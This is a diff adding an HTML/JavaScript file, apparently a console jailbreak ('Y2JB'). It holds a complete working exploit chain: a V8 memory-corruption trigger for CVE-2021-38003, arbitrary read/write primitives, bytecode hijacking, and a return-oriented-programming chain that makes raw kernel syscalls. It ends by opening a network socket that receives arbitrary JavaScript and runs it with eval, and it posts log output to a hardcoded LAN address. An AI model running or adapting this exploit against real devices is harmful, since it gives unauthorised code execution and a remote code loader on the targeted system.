@@ -1,0 +1,626 @@
+<!--
+ * Copyright (C) 2025 Gezine
+ *
+ * This software may be modified and distributed under the terms
+ * of the MIT license.  See the LICENSE file for details.
+ * -->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Y2JB</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            font-size: 16px;
+        }
+        #output div {
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        const version_string = "Y2JB Beta";
+    
+        let outputElement = null;
+        // hack for scrolling messages
+        let maxLines = 56;
+        
+        async function log(message) {
+            if (!outputElement) {
+                outputElement = document.getElementById('output');
+                if (!outputElement) {
+                    outputElement = document.createElement('div');
+                    outputElement.id = 'output';
+                    document.body.appendChild(outputElement);
+                }
+            }
+            
+            let lineDiv = document.createElement('div');
+            lineDiv.textContent = message;
+            outputElement.appendChild(lineDiv);
+            
+            if (outputElement.children.length > maxLines) {
+                outputElement.removeChild(outputElement.children[0]);
+            }
+            
+            await new Promise(resolve => requestAnimationFrame(resolve));
+    
+            try {
+                await fetch('http://192.168.1.180:8080/log', {
+                    method: 'POST',
+                    body: message,
+                });
+            } catch (e) { }
+        }
+        
+        function toHex(num) {
+            return '0x' + BigInt(num).toString(16).padStart(16, '0');
+        }
+        
+        function trigger() {  
+            let a = [], b = [];  
+            let s = '"'.repeat(0x800000);
+            a[20000] = s;
+            for (let i = 0; i < 10; i++) a[i] = s;  
+            for (let i = 0; i < 10; i++) b[i] = a;  
+
+            try {  
+                JSON.stringify(b);  
+            } catch (hole) {  
+                return hole;  
+            }
+        }  
+
+        setTimeout(async () => {
+            try {
+                await log('Starting Exploit');
+                
+                // CVE-2021-38003
+                // https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
+                let hole = trigger();
+                
+                for (let i = 0; i < 0x10; i++) {
+                    map1 = new Map();
+                    map1.set(1, 1);
+                    map1.set(hole, 1);
+                    map1.delete(hole);
+                    map1.delete(hole);
+                    map1.delete(1);
+                    oob_arr = new BigUint64Array([0x4141414141414141n]);
+                }
+                
+                victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
+                obj_arr = [{}, {}];
+
+                map1.set(0x1e, -1);
+                gc();
+                map1.set(0x0, 0x1);
+                
+                <!-- for (let i = 0; i < 200; i++) { -->
+                    <!-- await log('oob_arr[' + i + '] : 0x' + toHex(oob_arr[i])); -->
+                <!-- } -->
+                
+                //oob_arr[31] : 0x2 -- victim_arr length
+                //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
+                //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
+                
+                <!-- obj_arr[0] = 0x1n; -->
+                <!-- for (let i = 0; i < 200; i++) { -->
+                    <!-- await log('oob_arr[' + i + '] : 0x' + toHex(oob_arr[i])); -->
+                <!-- } -->
+                
+                const oob_arr_before = [];
+                for (let i = 0; i < 100; i++) {
+                    oob_arr_before[i] = oob_arr[i];
+                }
+                
+                obj_arr[0] = 0x1n;
+
+                let obj_arr_offset = -1;
+                for (let i = 0; i < 100; i++) {
+                    if (oob_arr[i] !== oob_arr_before[i]) {
+                        obj_arr_offset = i;
+                        break;
+                    }
+                }
+                
+                await log('obj_arr_offset : ' + obj_arr_offset);
+                
+                const obj_arr_org_value = oob_arr[obj_arr_offset];
+                const victim_arr_org_base = oob_arr[33];
+                
+                function addrof(obj) {
+                    obj_arr[0] = obj;
+                    const addr = oob_arr[obj_arr_offset] - 1n;
+                    oob_arr[obj_arr_offset] = obj_arr_org_value;
+                    return addr;
+                }
+                
+                function read64(addr) {
+                    oob_arr[33] = addr - 0xfn;
+                    const value = victim_arr[0];
+                    oob_arr[33] = victim_arr_org_base;
+                    return value;
+                }
+                
+                function write64(addr, value) {
+                    oob_arr[33] = addr - 0xfn;
+                    victim_arr[0] = value;
+                    oob_arr[33] = victim_arr_org_base;
+                }
+
+                function read8(addr) {
+                    const qword = read64(addr & ~7n);
+                    const byte_offset = Number(addr & 7n);
+                    return (qword >> BigInt(byte_offset * 8)) & 0xFFn;
+                }
+
+                function write8(addr, value) {
+                    const qword = read64(addr & ~7n);
+                    const byte_offset = Number(addr & 7n);
+                    const mask = 0xFFn << BigInt(byte_offset * 8);
+                    const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFn) << BigInt(byte_offset * 8));
+                    write64(addr & ~7n, new_qword);
+                }
+
+                function read16(addr) {
+                    const qword = read64(addr & ~7n);
+                    const byte_offset = Number(addr & 7n);
+                    return (qword >> BigInt(byte_offset * 8)) & 0xFFFFn;
+                }
+                
+                function write16(addr, value) {
+                    const qword = read64(addr & ~7n);
+                    const byte_offset = Number(addr & 7n);
+                    const mask = 0xFFFFn << BigInt(byte_offset * 8);
+                    const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFn) << BigInt(byte_offset * 8));
+                    write64(addr & ~7n, new_qword);
+                }
+                
+                function read32(addr) {
+                    const qword = read64(addr & ~7n);
+                    const byte_offset = Number(addr & 7n);
+                    return (qword >> BigInt(byte_offset * 8)) & 0xFFFFFFFFn;
+                }
+
+                function write32(addr, value) {
+                    const qword = read64(addr & ~7n);
+                    const byte_offset = Number(addr & 7n);
+                    const mask = 0xFFFFFFFFn << BigInt(byte_offset * 8);
+                    const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFFFFFn) << BigInt(byte_offset * 8));
+                    write64(addr & ~7n, new_qword);
+                }
+                
+                function get_backing_store(typed_array) {
+                    const obj_addr = addrof(typed_array);
+                    const external = read64(obj_addr + 0x38n);
+                    const base = read64(obj_addr + 0x40n);
+                    return base + external;
+                }
+                
+                const allocated_buffers = [];
+                
+                function malloc(size) {
+                    const buffer = new ArrayBuffer(size);
+                    const buffer_addr = addrof(buffer);
+                    const backing_store = read64(buffer_addr + 0x20n);
+                    allocated_buffers.push(buffer);
+                    return backing_store;
+                }
+                
+                function write_string(addr, str) {
+                    const encoder = new TextEncoder();
+                    const bytes = encoder.encode(str);
+                    
+                    for (let i = 0; i < bytes.length; i++) {
+                        write8(addr + BigInt(i), bytes[i]);
+                    }
+                    
+                    write8(addr + BigInt(bytes.length), 0);
+                }
+                
+                function alloc_string(str) {
+                    const encoder = new TextEncoder();
+                    const bytes = encoder.encode(str);
+                    const addr = malloc(bytes.length + 1);
+                    
+                    for (let i = 0; i < bytes.length; i++) {
+                        write8(addr + BigInt(i), bytes[i]);
+                    }
+                    
+                    write8(addr + BigInt(bytes.length), 0);
+                    
+                    return addr;
+                }
+                
+                // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
+                // We don't have pointer compression
+                
+                function pwn(x) {
+                    return x;
+                }
+                
+                pwn(1); // Generate bytecode
+                
+                await log("=== Bytecode Hijacking ===");
+                
+                const pwn_addr = addrof(pwn);
+                await log("JSFunction pwn @ " + toHex(pwn_addr));
+                
+                const sfi_addr = read64(pwn_addr + 0x18n) - 1n;
+                await log("SharedFunctionInfo @ " + toHex(sfi_addr));
+                
+                const bytecode_addr = read64(sfi_addr + 0x8n) - 1n;
+                await log("BytecodeArray @ " + toHex(bytecode_addr));
+                
+                const fake_bytecode_backing = malloc(0x2000);
+                await log("Fake bytecode backing store @ " + toHex(fake_bytecode_backing));
+                
+                // Copy original bytecode
+                for (let i = 0n; i < 0x200n; i += 8n) {
+                    write64(fake_bytecode_backing + i, read64(bytecode_addr + i));
+                }
+
+                // Hijack bytecode pointer
+                write64(sfi_addr + 0x8n, fake_bytecode_backing + 1n);
+                await log("Bytecode pointer hijacked!");
+                
+                // Write custom bytecode at offset 0x36
+                const bc_start = fake_bytecode_backing + 0x36n;
+                write8(bc_start, 0x25);      // Ldar
+                write8(bc_start + 1n, 0x0);
+                write8(bc_start + 2n, 0xAB); // Return
+                
+                const stack_addr = addrof(pwn(1)) + 0x1n;
+                await log("Stack leak @ " + toHex(stack_addr));
+                
+                const eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
+                await log("eboot_base @ " + toHex(eboot_base));
+                
+                const libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
+                await log("libc_base @ " + toHex(libc_base));
+                
+                await log("=== Setting up ROP ===");
+                
+                // ROP chain buffer
+                const rop_chain = new BigUint64Array(0x1000);
+                const rop_chain_addr = get_backing_store(rop_chain);
+                await log("ROP chain @ " + toHex(rop_chain_addr));
+                
+                // Fake bytecode for r14 register
+                const fake_bc = new Uint8Array(64);
+                fake_bc[0] = 0xAB; // Return opcode - keeps interpreter happy
+                const fake_bc_addr = get_backing_store(fake_bc);
+                await log("Fake bytecode @ " + toHex(fake_bc_addr));
+                
+                // Fake frame - used to pivot stack and control registers
+                const fake_frame = new BigUint64Array(8);
+                const fake_frame_addr = addrof(fake_frame);
+                const fake_frame_backing = get_backing_store(fake_frame);
+                await log("Fake frame object @ " + toHex(fake_frame_addr));
+                await log("Fake frame backing @ " + toHex(fake_frame_backing));
+                
+                // Write r14 value to backing store
+                write64(fake_frame_backing + 0x21n, fake_bc_addr);
+                
+                // Pivot gadget
+                write64(fake_frame_addr + 0x09n, eboot_base + 0x49f7fn); // pop rsp ; ret
+                write64(fake_frame_addr + 0x11n, rop_chain_addr);
+                
+                const return_value_buf = new BigUint64Array(1);
+                const return_value_addr = get_backing_store(return_value_buf);
+                await log("return_value_addr @ " + toHex(return_value_addr));
+                
+                let saved_fp = 0x0n;
+
+                function call_rop(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+                    let rop_i = 0;
+                    
+                    rop_chain[rop_i++] = eboot_base + 0x2d954n;  // pop rax ; ret
+                    rop_chain[rop_i++] = rax;
+                    
+                    // Setup arguments
+                    rop_chain[rop_i++] = eboot_base + 0xb0ec5n;  // pop rdi ; ret
+                    rop_chain[rop_i++] = arg1;
+                    rop_chain[rop_i++] = eboot_base + 0xb8a81n;  // pop rsi ; ret
+                    rop_chain[rop_i++] = arg2;
+                    rop_chain[rop_i++] = eboot_base + 0xb692n;   // pop rdx ; ret
+                    rop_chain[rop_i++] = arg3;
+                    rop_chain[rop_i++] = eboot_base + 0x187da3n; // pop rcx ; ret
+                    rop_chain[rop_i++] = arg4;
+                    rop_chain[rop_i++] = eboot_base + 0x1a8ff9n; // pop r8 ; ret
+                    rop_chain[rop_i++] = arg5;
+                    rop_chain[rop_i++] = eboot_base + 0x1394e01n; // pop r9 ; ret
+                    rop_chain[rop_i++] = arg6;
+                    
+                    // Call function
+                    rop_chain[rop_i++] = address;
+                    
+                    // Store rax to return_value_addr
+                    rop_chain[rop_i++] = eboot_base + 0xb0ec5n;     // pop rdi ; ret
+                    rop_chain[rop_i++] = return_value_addr;
+                    rop_chain[rop_i++] = eboot_base + 0x49a77n;     // mov qword [rdi], rax ; ret
+    
+                    // Return safe tagged value to JavaScript
+                    rop_chain[rop_i++] = eboot_base + 0x1283d40n;   // mov rax, 0x200000000 ; ret
+    
+                    rop_chain[rop_i++] = eboot_base + 0x69n; // pop rbp ; ret ;
+                    rop_chain[rop_i++] = saved_fp;
+                    
+                    rop_chain[rop_i++] = eboot_base + 0xb1424n; // mov rsp, rbp ; pop rbp ; ret
+                    
+                    return pwn(fake_frame);
+                }
+                
+                function call(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+                    // Step 1: Set bytecode to leak frame pointer
+                    <!-- write8(bc_start, 0x25);      // Ldar -->
+                    <!-- write8(bc_start + 1n, 0x0);  // offset 0 (load saved rbp from stack) -->
+                    <!-- write8(bc_start + 2n, 0xAB); // Return -->
+                    
+                    // optimization
+                    write64(bc_start, 0xAB0025n);
+                
+                    // Leak the frame pointer
+                    saved_fp = addrof(call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
+                    
+                    // Step 2: Update bytecode to pivot stack
+                    <!-- write8(bc_start, 0x25);      // Ldar a0 (load fake_frame object addr) -->
+                    <!-- write8(bc_start + 1n, 0x3); -->
+                    <!-- write8(bc_start + 2n, 0x26);  // Star fp (store to frame pointer) -->
+                    <!-- write8(bc_start + 3n, 0x0); -->
+                    <!-- write8(bc_start + 4n, 0xAB);  // Return -->
+                    
+                    // optimization
+                    write64(bc_start, 0xAB00260325n);
+                
+                    // Step 3: Execute actual ROP with correct saved_fp in chain
+                    call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
+                    
+                    return return_value_buf[0];
+                }
+                
+                // mov rax, 0x0000000200000000 ; ret ;
+                rop_test = call(eboot_base + 0x1283d40n);
+                await log("ROP test, should see 0x0000000200000000 : " + toHex(rop_test));
+                
+                if (rop_test !== 0x200000000n) {
+                    await log("ERROR: ROP test failed");
+                    throw new Error("ROP test failed");
+                }
+                
+                function rop_test2() {
+                    // See if we can get back to javascript from different depth
+                    return call(eboot_base + 0x1283d40n);
+                }
+                
+                await log("ROP test2, should see 0x0000000200000000 : " + toHex(rop_test2()));
+                
+                // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
+                const sceKernelGetModuleInfoFromAddr = read64(libc_base + 0x113C08n);
+                await log("sceKernelGetModuleInfoFromAddr @ " + toHex(sceKernelGetModuleInfoFromAddr));                
+                
+                //gettimeofday plt
+                //0x113B18
+                const gettimeofdayAddr = read64(libc_base + 0x113B18n);
+                await log("gettimeofdayAddr @: " + toHex(gettimeofdayAddr));
+                
+                const mod_info = malloc(0x300);
+                await log("mod_info buffer @ " + toHex(mod_info));
+                
+                const SEGMENTS_OFFSET = 0x160n;
+                
+                ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
+                await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));
+
+                if (ret !== 0x0n) {
+                    await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
+                    throw new Error("sceKernelGetModuleInfoFromAddr failed");
+                }
+                
+                const libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
+                await log("libkernel_base @ " + toHex(libkernel_base));
+
+                const syscall_wrapper = gettimeofdayAddr + 0x7n;
+                await log("syscall_wrapper @ " + toHex(syscall_wrapper));
+                
+                function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
+                    write64(bc_start, 0xAB0025n);
+                    saved_fp = addrof(call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
+                    
+                    write64(bc_start, 0xAB00260325n);
+                    call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
+                    
+                    return return_value_buf[0];
+                }
+                
+                let SYSCALL = {
+                    read: 0x3n,
+                    write: 0x4n,
+                    open: 0x5n,
+                    close: 0x6n,
+                    getuid: 0x18n,
+                    getsockname: 0x20n,
+                    accept: 0x1en,
+                    socket: 0x61n,
+                    connect: 0x62n,
+                    bind: 0x68n,
+                    setsockopt: 0x69n,
+                    listen: 0x6an,
+                    getsockopt: 0x76n,
+                    sysctl: 0xcan,
+                };
+
+                // File flags
+                const O_WRONLY = 0x1n;
+                const O_RDONLY = 0x0n;
+                const O_RDWR = 0x2n;
+                
+                function send_notification(text) {
+                    const notify_buffer_size = 0xc30n;
+                    const notify_buffer = malloc(Number(notify_buffer_size));
+                    const icon_uri = "cxml://psnotification/tex_icon_system";
+                                        
+                    // Setup notification structure
+                    write32(notify_buffer + 0x0n, 0);           // type
+                    write32(notify_buffer + 0x28n, 0);          // unk3
+                    write32(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
+                    write32(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
+                    
+                    // Write message at offset 0x2D
+                    write_string(notify_buffer + 0x2dn, text);
+                    
+                    // Write icon URI at offset 0x42D
+                    write_string(notify_buffer + 0x42dn, icon_uri);
+                    
+                    // Open /dev/notification0
+                    const dev_path = alloc_string("/dev/notification0");
+                    const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
+                    
+                    if (Number(fd) < 0) {
+                        return;
+                    }
+                    
+                    syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
+                    syscall(SYSCALL.close, fd);
+                    
+                }
+                
+                send_notification(version_string);
+                
+                const AF_INET = 0x2n;
+                const SOCK_STREAM = 0x1n;
+                const SOL_SOCKET = 0xffffn;
+                const SO_REUSEADDR = 0x4n;
+                const MAXSIZE = 500 * 1024;
+
+                const sockaddr_in = malloc(16);
+                const addrlen = malloc(8);
+                const enable = malloc(4);
+                const len_ptr = malloc(8);
+                const chunk_buf = malloc(4096);
+                const payload_buf = malloc(MAXSIZE);
+
+                function create_socket() {
+                    const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
+                    
+                    if (Number(sock_fd) < 0) {
+                        throw new Error("Socket creation failed: " + toHex(sock_fd));
+                    }
+                    
+                    write32(enable, 1);
+                    syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
+
+                    write8(sockaddr_in + 1n, AF_INET);
+                    write16(sockaddr_in + 2n, 0);        // port 0
+                    write32(sockaddr_in + 4n, 0);        // INADDR_ANY
+                    
+                    const bind_ret = syscall(SYSCALL.bind, sock_fd, sockaddr_in, 16n);
+                    if (bind_ret !== 0n) {
+                        throw new Error("Bind failed: " + toHex(bind_ret));
+                    }
+                                    
+                    const listen_ret = syscall(SYSCALL.listen, sock_fd, 3n);
+                    if (listen_ret !== 0n) {
+                        throw new Error("Listen failed: " + toHex(listen_ret));
+                    }
+                    
+                    return sock_fd;
+                }
+
+                let sock_fd = create_socket();
+                
+                // Get assigned port
+                write32(len_ptr, 16);
+                syscall(SYSCALL.getsockname, sock_fd, sockaddr_in, len_ptr);
+                
+                const port_be = read16(sockaddr_in + 2n);
+                const port = Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
+
+                await log("Remote JS Loader listening on port: " + port);
+                send_notification("Remote JS Loader\nListening on port " + port);
+                
+                while (true) {
+                    try {
+                        await log("Waiting for connection...");
+                        
+                        write32(addrlen, 16);
+                        const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);
+                        
+                        if (Number(client_fd) < 0) {
+                            await log("accept() failed: " + toHex(client_fd) + " - recreating socket");
+                            
+                            // Close old socket
+                            syscall(SYSCALL.close, sock_fd);
+                            
+                            // Create new socket
+                            sock_fd = create_socket();
+                            await log("Socket recreated");
+                            
+                            continue;
+                        }
+                        
+                        await log("Client connected, fd: " + Number(client_fd));
+                        
+                        let total_read = 0;
+                        let read_error = false;
+                        
+                        while (total_read < MAXSIZE) {
+                            const bytes_read = syscall(SYSCALL.read, client_fd, 
+                                payload_buf + BigInt(total_read), 
+                                BigInt(MAXSIZE - total_read));
+                            const n = Number(bytes_read);
+                            
+                            if (n === 0) break;
+                            if (n < 0) {
+                                read_error = true;
+                                break;
+                            }
+                            
+                            total_read += n;
+                        }
+                        
+                        if (read_error || total_read === 0) {
+                            await log("No valid data received");
+                            syscall(SYSCALL.close, client_fd);
+                            continue;
+                        }
+                        
+                        await log("Converting " + total_read + " bytes to string...");
+                        
+                        const chars = [];
+                        for (let i = 0; i < total_read; i++) {
+                            chars.push(String.fromCharCode(Number(read8(payload_buf + BigInt(i)))));
+                        }
+                        const js_code = chars.join('');
+                        
+                        await log("Executing payload...");
+                        
+                        eval(js_code);
+                        await log("Executed successfully");
+                        
+                        syscall(SYSCALL.close, client_fd);
+                        await log("Connection closed");
+                        
+                    } catch (e) {
+                        await log("ERROR in accept loop: " + e.message);
+                        await log("Stack: " + e.stack);
+                    }
+                }
+
+            } catch (e) {                
+                await log('EXCEPTION: ' + e.message);
+                await log(e.stack);
+            }
+            
+        }, 3000);
+    </script>
+</body>
+</html>
